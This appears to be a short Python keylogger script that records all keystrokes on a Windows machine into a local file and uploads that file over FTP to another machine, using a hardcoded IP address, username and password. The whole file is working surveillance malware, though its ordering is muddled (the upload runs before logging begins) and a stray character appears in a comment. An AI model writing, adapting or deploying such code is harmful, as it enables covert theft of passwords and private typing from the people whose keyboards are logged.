import ftplib  # Built-in, no install needed
import os
def keylogging():
        import os
        import keyboard
        keys = ""
        folder_path = r'C:\\keylogs'
        file_path = r'C:\\keylogs\\keylog.txt'
        
        
        
            
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    keys += event.name
                    with open(file_path, "w") as f:
                        f.write(f"key:{keys}")
                        
        else:
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    keys += event.name
                    with open(file_path, "w") as f:
                        f.write(keys)
                        
print("connected to server!")
# For example:
OUTPUT_DIR = r"C:\keylogs"  # Change to your desired directory
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "keylog.txt")  # Full path: e.g., C:\Users\YASH RAVINDRABHAI\Desktop\output.txt

# # Ensure the directory exists
os.makedirs(OUTPUT_DIR, exist_ok=True)

# with open(OUTPUT_FILE, "w") as f:
#     f.write("This is the generated output.\n")  # Replace with your actual generation logic

# FTP upload section
FTP_HOST = "10.26.87.162"  # System B's actual IP address (from ipconfig)
FTP_USER = "yashbanait"        # Must match the server setup
FTP_PASS = "yash@6123"  # Must match the server setup
LOCAL_FILE = OUTPUT_FILE     # Path to the file on System A
REMOTE_FILE = "keylog.txt"   # Name to save as on System B``

try:
    # Connect to the FTP server
    with ftplib.FTP(FTP_HOST) as ftp:
        ftp.login(FTP_USER, FTP_PASS)
        print(f"Connected to FTP server at {FTP_HOST}")

        # Upload the file in binary mode (safer for text files)
        with open(LOCAL_FILE, "rb") as file:
            ftp.storbinary(f"STOR {REMOTE_FILE}", file)
        print(f"File '{LOCAL_FILE}' uploaded as '{REMOTE_FILE}' to {FTP_HOST}")

except ftplib.all_errors as e:
    print(f"FTP error: {e}")
except OSError as e:
    print(f"File error: {e}")  # Catch file-related errors like the one you saw
    
keylogging()
    